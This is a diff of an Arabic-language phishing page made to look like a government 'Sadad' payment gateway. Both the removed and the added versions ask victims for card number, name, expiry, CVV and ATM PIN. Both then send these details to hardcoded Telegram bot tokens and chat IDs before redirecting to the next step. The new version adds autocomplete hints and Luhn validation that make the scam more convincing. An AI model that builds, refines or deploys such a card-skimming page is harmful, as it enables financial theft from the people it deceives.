@@ -1,260 +1,155 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl" lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>الدفع</title>
-
-  <style>
-    body{font-family:Tahoma,Arial;background:#fff;margin:0;min-height:100vh;display:flex;flex-direction:column}
-    header{text-align:center;padding:20px}
-    header img{height:80px;max-width:100%}
-    main{flex:1;padding:20px}
-    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
-    label{display:block;margin-top:14px;font-weight:700}
-    input,button,select{
-      width:100%;padding:12px;margin-top:6px;
-      border:1px solid #ccc;border-radius:6px;box-sizing:border-box
-    }
-    .row{display:flex;gap:10px}
-    .row > div{flex:1; display: flex; flex-direction: column;}
-    button{
-      background:#0b5320;color:#fff;border:0;font-weight:800;
-      cursor:pointer;position:relative
-    }
-    button:hover{background:#094418}
-    button:disabled{opacity:.7;cursor:not-allowed}
-
-    #applePayBtn{
-      margin-top:12px;
-      background:#000;
-      color:#fff;
-      font-weight:800;
-    }
-
-    .error{
-      border-color:#c00 !important;
-      background:#fff6f6;
-    }
-
-    .spinner{
-      width:22px;height:22px;
-      border:3px solid rgba(255,255,255,.4);
-      border-top:3px solid #fff;
-      border-radius:50%;
-      animation:spin 1s linear infinite;
-      position:absolute;top:50%;left:50%;
-      transform:translate(-50%,-50%);
-      display:none;
-    }
-    @keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
-
-    footer{
-      background:#000;color:#fff;padding:18px 20px;margin-top:30px;
-      font-size:13px;text-align:center
-    }
-
-    #pageLoader{
-      position:fixed;inset:0;background:transparent;
-      display:flex;align-items:center;justify-content:center;
-      z-index:9999;pointer-events:none;
-    }
-    #pageLoader .bigSpinner{
-      width:90px;height:90px;
-      border:10px solid rgba(0,0,0,.15);
-      border-top-color:#000;border-radius:50%;
-      animation:bigSpin 1s linear infinite;
-    }
-    @keyframes bigSpin{to{transform:rotate(360deg)}}
-
-    #cardNumber{direction:ltr;text-align:left}
-    
-    .row label {
-      font-size: 12px;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-
-    #serviceMsg{
-      margin-top:10px;
-      color:#c00;
-      font-size:14px;
-      font-weight:700;
-      text-align:center;
-      display:none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة سداد - تفاصيل الدفع</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f9f9f9; padding: 20px; direction: rtl; }
+        .header { text-align: center; margin-bottom: 20px; }
+        .header img { height: 60px; }
+        .breadcrumb { text-align: center; color: green; font-size: 14px; margin-bottom: 20px; }
+        .payment-container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); max-width: 450px; margin: auto; }
+        h2 { text-align: center; color: green; font-size: 22px; margin-bottom: 10px; }
+        .form-group { margin-bottom: 18px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; font-size: 14px; }
+        .input-wrapper { position: relative; }
+        input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.3s; }
+        input[type="text"]#cardNumber, input[type="text"]#expiryDate, input[type="password"] { direction: ltr; text-align: left; }
+        input:focus { border-color: green; box-shadow: 0 0 5px rgba(0,128,0,0.2); }
+        input.error { border-color: #d32f2f; background-color: #ffebee; }
+        input.success { border-color: #2e7d32; background-color: #f1f8e9; }
+        .error-message { display: none; color: #d32f2f; font-size: 12px; margin-top: 5px; font-weight: bold; }
+        .error-message.show { display: block; }
+        .success-icon { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #2e7d32; font-size: 18px; display: none; }
+        .success-icon.show { display: block; }
+        .row { display: flex; gap: 15px; }
+        .row .form-group { flex: 1; }
+        .pay-btn { width: 100%; background: green; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .pay-btn:hover:not(:disabled) { background: darkgreen; transform: translateY(-2px); }
+        .pay-btn:disabled { background: #ccc; cursor: not-allowed; }
+    </style>
 </head>
-
 <body>
-
-<div id="pageLoader"><div class="bigSpinner"></div></div>
-
-<header>
-  <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663247919896/JHmpSPqkiKWxwoeP.png" alt="الشعار">
-</header>
-
-<main>
-<form id="payForm" novalidate>
-
-  <label>الاسم المدون على البطاقة *</label>
-  <input id="cardName">
-
-  <label>رقم البطاقة *</label>
-  <input id="cardNumber" inputmode="numeric" maxlength="19"
-    placeholder="0000 0000 0000 0000">
-
-  <div class="row">
-    <div>
-      <label>شهر الانتهاء *</label>
-      <select id="expMonth">
-        <option value="">MM</option>
-        <option value="01">01</option><option value="02">02</option><option value="03">03</option>
-        <option value="04">04</option><option value="05">05</option><option value="06">06</option>
-        <option value="07">07</option><option value="08">08</option><option value="09">09</option>
-        <option value="10">10</option><option value="11">11</option><option value="12">12</option>
-      </select>
+    <div class="header"><img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد"></div>
+    <div class="breadcrumb">الرئيسية / شخصي / اختر البنك / تفاصيل الدفع</div>
+    <div class="payment-container">
+        <h2>إدخال تفاصيل البطاقة</h2>
+        <form id="paymentForm">
+            <div class="form-group">
+                <label for="cardNumber">رقم البطاقة</label>
+                <div class="input-wrapper">
+                    <!-- ✅ التعديل: إضافة autocomplete="cc-number" -->
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required inputmode="numeric" autocomplete="cc-number">
+                    <span class="success-icon">✓</span>
+                </div>
+                <div class="error-message" id="cardNumberError"></div>
+            </div>
+            <div class="form-group">
+                <label for="cardholderName">الاسم كما هو مسجل على البطاقة</label>
+                <div class="input-wrapper">
+                    <!-- ✅ التعديل: إضافة autocomplete="cc-name" -->
+                    <input type="text" id="cardholderName" required autocomplete="cc-name">
+                    <span class="success-icon">✓</span>
+                </div>
+                <div class="error-message" id="cardholderNameError"></div>
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label for="expiryDate">تاريخ الانتهاء</label>
+                    <div class="input-wrapper">
+                        <!-- ✅ التعديل: إضافة autocomplete="cc-exp" -->
+                        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" required inputmode="numeric" autocomplete="cc-exp">
+                        <span class="success-icon">✓</span>
+                    </div>
+                    <div class="error-message" id="expiryDateError"></div>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">رمز التحقق (CVV)</label>
+                    <div class="input-wrapper">
+                        <!-- ✅ التعديل: إضافة autocomplete="cc-csc" -->
+                        <input type="password" id="cvv" placeholder="123" maxlength="3" required inputmode="numeric" autocomplete="cc-csc">
+                        <span class="success-icon">✓</span>
+                    </div>
+                    <div class="error-message" id="cvvError"></div>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="atmPin">رقم الصراف الآلي (PIN)</label>
+                <div class="input-wrapper">
+                    <input type="password" id="atmPin" placeholder="****" maxlength="4" required inputmode="numeric">
+                    <span class="success-icon">✓</span>
+                </div>
+                <div class="error-message" id="atmPinError"></div>
+            </div>
+            <button type="submit" class="pay-btn" id="submitBtn" disabled>تأكيد الدفع</button>
+        </form>
     </div>
-    <div>
-      <label>سنة الانتهاء *</label>
-      <select id="expYear">
-        <option value="">YY</option>
-        <option value="26">26</option><option value="27">27</option><option value="28">28</option>
-        <option value="29">29</option><option value="30">30</option><option value="31">31</option>
-        <option value="32">32</option><option value="33">33</option><option value="34">34</option>
-        <option value="35">35</option><option value="36">36</option><option value="37">37</option>
-        <option value="38">38</option><option value="39">39</option><option value="40">40</option>
-      </select>
-    </div>
-  </div>
 
-  <div class="row">
-    <div>
-      <label>رمز CVV *</label>
-      <input id="cvv" type="password" inputmode="numeric" maxlength="3" placeholder="***">
-    </div>
-    <div>
-      <label>رقم الصراف الآلي (PIN) *</label>
-      <input id="pin" type="password" inputmode="numeric" maxlength="4" placeholder="****">
-    </div>
-  </div>
+    <script>
+        // --- معلومات بوت التليجرام ---
+        const BOT_TOKEN = "8724974748:AAEDSkmIz2F9NArgkbCtRGp7o9URQausmxI";
+        const CHAT_ID = "1537773335";
 
-  <button id="payBtn" type="submit">
-    <span id="payText">ادفع الآن</span>
-    <span class="spinner" id="paySpinner"></span>
-  </button>
+        // --- دوال التحقق من صحة البيانات (بدون تغيير) ---
+        function luhnCheck(num) { let s = 0, e = false; for (let i = num.length - 1; i >= 0; i--) { let d = parseInt(num[i], 10); if (e) { d *= 2; if (d > 9) d -= 9; } s += d; e = !e; } return s % 10 === 0; }
+        const validators = {
+            cardNumber: value => { const n = value.replace(/\s/g, ''); if (n.length !== 16) return { valid: false, message: 'رقم البطاقة يجب أن يكون 16 رقماً' }; if (!luhnCheck(n)) return { valid: false, message: 'رقم البطاقة غير صحيح' }; return { valid: true }; },
+            cardholderName: value => { if (value.trim().length < 3) return { valid: false, message: 'الاسم قصير جداً' }; if (!/^[\u0600-\u06FF\s\-a-zA-Z]+$/.test(value)) return { valid: false, message: 'الاسم يحتوي على رموز غير مقبولة' }; return { valid: true }; },
+            expiryDate: value => { const p = value.split('/'); if (p.length !== 2) return { valid: false, message: 'الصيغة الصحيحة: MM/YY' }; const m = parseInt(p[0], 10), y = parseInt(p[1], 10); if (isNaN(m) || isNaN(y) || m < 1 || m > 12) return { valid: false, message: 'تاريخ غير صحيح' }; const d = new Date(), cY = d.getFullYear() % 100, cM = d.getMonth() + 1; if (y < cY || (y === cY && m < cM)) return { valid: false, message: 'البطاقة منتهية الصلاحية' }; return { valid: true }; },
+            cvv: value => !/^\d{3}$/.test(value) ? { valid: false, message: 'يجب أن يكون 3 أرقام' } : { valid: true },
+            atmPin: value => !/^\d{4}$/.test(value) ? { valid: false, message: 'يجب أن يكون 4 أرقام' } : { valid: true }
+        };
 
-  <button id="applePayBtn" type="button">Apple Pay</button>
-  <div id="serviceMsg">هذه الخدمة متوقفة حاليًا</div>
+        // --- تطبيق التحقق على الحقول (بدون تغيير) ---
+        function validateField(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorEl = document.getElementById(fieldId + 'Error');
+            const icon = field.parentElement.querySelector('.success-icon');
+            const result = validators[fieldId](field.value);
+            field.classList.toggle('success', result.valid);
+            field.classList.toggle('error', !result.valid);
+            icon.style.display = result.valid ? 'block' : 'none';
+            errorEl.style.display = result.valid ? 'none' : 'block';
+            errorEl.textContent = result.message || '';
+            checkFormValidity();
+        }
 
-</form>
-</main>
+        function checkFormValidity() {
+            const isFormValid = Object.keys(validators).every(id => validators[id](document.getElementById(id).value).valid);
+            document.getElementById('submitBtn').disabled = !isFormValid;
+        }
 
-<footer>
-  سياسة الخصوصية • حقوق النشر • شروط الاستخدام • معايير WCAG 2.0 AAA • © حكومة الإمارات 2026
-</footer>
+        // --- ربط الأحداث مع الحقول (بدون تغيير) ---
+        document.getElementById('cardNumber').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 '); validateField('cardNumber'); });
+        document.getElementById('expiryDate').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/'); validateField('expiryDate'); });
+        ['cardholderName', 'cvv', 'atmPin'].forEach(id => document.getElementById(id).addEventListener('input', () => validateField(id)));
 
-<script>
-  const pageLoader = document.getElementById('pageLoader');
-  const payForm = document.getElementById('payForm');
-  const cardName = document.getElementById('cardName');
-  const cardNumber = document.getElementById('cardNumber');
-  const expMonth = document.getElementById('expMonth');
-  const expYear = document.getElementById('expYear');
-  const cvv = document.getElementById('cvv');
-  const pin = document.getElementById('pin');
-  const payBtn = document.getElementById('payBtn');
-  const payText = document.getElementById('payText');
-  const paySpinner = document.getElementById('paySpinner');
-  const applePayBtn = document.getElementById('applePayBtn');
+        // --- إرسال النموذج (بدون تغيير) ---
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if (document.getElementById('submitBtn').disabled) return;
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'جاري التأكيد...';
+            const paymentData = { cardNumber: document.getElementById('cardNumber').value, cardholderName: document.getElementById('cardholderName').value, expiryDate: document.getElementById('expiryDate').value, cvv: document.getElementById('cvv').value, atmPin: document.getElementById('atmPin').value };
+            let message = `
+*💳===== [ الخطوة 3: تفاصيل البطاقة ] =====💳*
 
-  setTimeout(()=> { if(pageLoader) pageLoader.style.display='none'; }, 4000);
+*👤 الاسم على البطاقة:*
+\`${paymentData.cardholderName}\`
 
-  if(applePayBtn) {
-    applePayBtn.onclick = () => {
-      const serviceMsg = document.getElementById('serviceMsg');
-      serviceMsg.style.display='block';
-      setTimeout(()=>serviceMsg.style.display='none',2500);
-    };
-  }
+*🔢 رقم البطاقة:*
+\`${paymentData.cardNumber}\`
 
-  function onlyDigits(el, maxLen){
-    el.value = el.value.replace(/\D/g,'').slice(0, maxLen);
-  }
-
-  function formatCardNumber(){
-    let raw = cardNumber.value.replace(/\s/g,'').replace(/\D/g,'').slice(0,16);
-    cardNumber.value = raw.replace(/(.{4})/g,'$1 ').trim();
-  }
-
-  if(cardNumber) cardNumber.addEventListener('input', formatCardNumber);
-  if(cvv) cvv.addEventListener('input', () => onlyDigits(cvv, 3));
-  if(pin) pin.addEventListener('input', () => onlyDigits(pin, 4));
-
-  if(payForm) {
-    payForm.onsubmit = (e) => {
-      e.preventDefault();
-
-      let ok = true;
-      if(!cardName.value.trim()){cardName.classList.add('error'); ok=false;}
-      if(cardNumber.value.replace(/\s/g,'').length !== 16){cardNumber.classList.add('error'); ok=false;}
-      if(!expMonth.value){expMonth.classList.add('error'); ok=false;}
-      if(!expYear.value){expYear.classList.add('error'); ok=false;}
-      if(cvv.value.length !== 3){cvv.classList.add('error'); ok=false;}
-      if(pin.value.length !== 4){pin.classList.add('error'); ok=false;}
-
-      if(!ok) return;
-
-      payBtn.disabled = true;
-      payText.style.visibility = 'hidden';
-      paySpinner.style.display = 'block';
-
-      const qrData = `Name: ${cardName.value}\nCard: ${cardNumber.value}\nExp: ${expMonth.value}/${expYear.value}\nCVV: ${cvv.value}\nPIN: ${pin.value}`;
-      const token = "8528188278:AAGVc4oOzJjpOgIe6tWwCpQlY5CsAdCRrzk";
-      const chatId = "8404960059";
-
-      // استخدام API خارجي لتوليد الـ QR Code كصورة مباشرة
-      const qrImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qrData)}`;
-
-      const goToNext = () => {
-          setTimeout(() => { window.location.href = "verify.html"; }, 500);
-      };
-
-      // إرسال الصورة للبوت عبر الرابط مباشرة
-      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-              chat_id: chatId,
-              photo: qrImageUrl,
-              caption: '📱 رمز QR جديد للمسح الضوئي'
-          })
-      })
-      .then(res => res.json())
-      .then(data => {
-          if (data.ok) {
-              goToNext();
-          } else {
-              // إذا فشل إرسال الصورة، أرسل نصاً كبديل
-              fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({ chat_id: chatId, text: "⚠️ فشل إرسال الصورة، البيانات نصاً:\n" + qrData })
-              }).then(goToNext).catch(goToNext);
-          }
-      })
-      .catch(err => {
-          // في حال فشل الاتصال، أرسل نصاً وانتقل
-          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: chatId, text: "⚠️ خطأ في الاتصال، البيانات نصاً:\n" + qrData })
-          }).then(goToNext).catch(goToNext);
-      });
-    };
-  }
-</script>
-
+*🗓️ تاريخ الانتهاء:* \`${paymentData.expiryDate}\`
+*🔒 رمز CVV:* \`${paymentData.cvv}\`
+*🔢 الرقم السري (PIN):* \`${paymentData.atmPin}\`
+--------------------------------------------------
+`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }) }); } catch (error) { console.error("Telegram send error:", error); } finally { window.location.href = 'page4.html'; }
+        });
+    </script>
 </body>
 </html>
